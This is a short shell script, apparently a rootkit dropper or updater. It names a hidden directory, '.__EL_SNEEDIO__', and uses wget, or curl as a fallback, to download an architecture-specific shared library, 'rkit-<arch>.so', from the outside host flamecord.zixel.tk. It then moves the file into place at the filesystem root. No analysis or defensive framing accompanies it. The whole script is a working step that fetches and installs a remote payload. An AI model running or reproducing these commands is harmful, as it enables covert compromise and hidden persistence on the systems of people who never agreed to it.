rkit_key=.__EL_SNEEDIO__
wget flamecord.zixel.tk/rkit-`uname -m`.so -O /$rkit_key/$rkit_key.so.new || curl -L flamecord.zixel.tk/rkit-`uname -m`.so -o /$rkit_key/$rkit_key.so.new
mv /$rkit_key/$rkit_key.so.new /$rkit_key/$rkit_key.so
echo END
